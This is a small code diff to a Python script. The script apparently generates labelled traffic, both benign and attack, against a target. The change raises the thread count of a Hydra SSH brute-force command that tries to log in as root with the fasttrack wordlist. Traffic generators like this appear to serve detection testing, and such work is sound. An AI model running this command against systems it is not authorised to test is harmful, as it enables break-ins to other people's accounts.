@@ -36,7 +36,7 @@ def run_benign(target, duration):
 def run_ssh_brute(target, duration):
     print(f"[*] Starting SSH Brute Force attack on {target} for {duration}s...")
     # Use fasttrack.txt since it is uncompressed on Kali by default
-    cmd = f"hydra -l root -P /usr/share/wordlists/fasttrack.txt ssh://{target} -t 4"
+    cmd = f"hydra -l root -P /usr/share/wordlists/fasttrack.txt ssh://{target} -t 16"
     proc = subprocess.Popen(cmd.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     time.sleep(duration)
     proc.terminate()
